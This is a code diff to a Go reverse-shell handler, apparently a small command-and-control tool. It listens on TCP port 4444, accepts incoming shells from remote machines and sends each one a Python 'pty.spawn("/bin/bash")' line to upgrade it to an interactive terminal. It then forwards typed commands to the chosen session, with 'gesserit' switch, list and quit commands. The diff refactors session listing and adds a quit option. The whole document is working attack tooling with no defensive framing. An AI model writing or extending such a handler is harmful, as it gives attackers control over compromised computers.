@@ -9,7 +9,7 @@ import (
 
 const (
 	HOST = "192.168.172.1"
-	PORT = "4242"
+	PORT = "4444"
 	TYPE = "tcp"
 )
 
@@ -38,6 +38,7 @@ func handleConnection(s session) {
 	fmt.Println("attempting to spawn tty session...")
 	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
 	sendData(s.connection, tty_spawn)
+	fmt.Println("------------------------------------------")
 	for {
 		fmt.Print(receiveData(s.connection))
 	}
@@ -61,6 +62,16 @@ func listen(l net.Listener, sessions *[]session){
 	}
 }
 
+func list_sessions(sessions []session, currentSession int){
+	for i:= 0; i < len(sessions); i++ {
+		if i == currentSession {
+			fmt.Println("*", sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
+		}else{
+			fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
+		}
+	}
+}
+
 func main() {
 
 	currentSession := 0
@@ -80,18 +91,15 @@ func main() {
 		reader := bufio.NewReader(os.Stdin)
 		cmd, _ := reader.ReadString('\n')
 		if cmd == "gesserit switch\n" {
+			list_sessions(sessions, currentSession)
 			fmt.Println("change session to?")
 			var newS int
 			fmt.Scanln(&newS)
 			currentSession = newS
 		} else if cmd == "gesserit list\n"{
-			for i:= 0; i < len(sessions); i++ {
-				if i == currentSession {
-					fmt.Println("*", sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
-				}else{
-					fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
-				}
-			}
+			list_sessions(sessions, currentSession)
+		} else if cmd == "gesserit quit\n" {
+			os.Exit(3)
 		} else {
 			sendData(sessions[currentSession].connection, cmd)
 		}
